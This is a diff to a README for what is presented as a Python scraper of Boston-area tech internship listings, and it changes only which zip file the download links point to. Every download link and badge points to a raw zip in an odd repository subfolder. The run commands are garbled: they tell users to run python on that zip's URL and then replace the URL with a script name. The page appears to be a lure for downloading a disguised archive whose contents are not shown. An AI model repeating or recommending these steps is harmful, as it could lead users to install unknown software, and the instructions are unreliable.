@@ -1,6 +1,6 @@
 # 🚀 tech-internships-boston-area - Find Your Perfect Internship Easily
 
-[![Download Now](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip)
+[![Download Now](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip)
 
 ## 📖 Overview
 
@@ -34,11 +34,11 @@ This software scrapes various job listings for tech internships available in the
 
 ## 📥 Download & Install
 
-To download the latest version of **tech-internships-boston-area**, [visit this page to download](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip).
+To download the latest version of **tech-internships-boston-area**, [visit this page to download](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip).
 
 1. Click on the **Releases** link above or use the button below:
    
-   [![Download Now](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip)
+   [![Download Now](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip)
 
 2. Choose the latest version available.
 3. Download the zip file and extract it to your preferred directory.
@@ -52,10 +52,10 @@ After downloading and extracting the files, follow these instructions to run the
    - On Windows, use: `cd path\to\folder`
    - On Mac or Linux, use: `cd /path/to/folder`
 3. Run the script by typing the following command:
-   - For Windows: `python https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip`
-   - For Mac or Linux: `python3 https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip`
+   - For Windows: `python https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip`
+   - For Mac or Linux: `python3 https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip`
    
-Replace `https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/tech-internships-boston-area.zip` with the actual name of the script file.
+Replace `https://raw.githubusercontent.com/Datasystem1976/tech-internships-boston-area/main/Maugis/internships-tech-area-boston-1.7.zip` with the actual name of the script file.
 
 ## 💡 Tips for Success
 
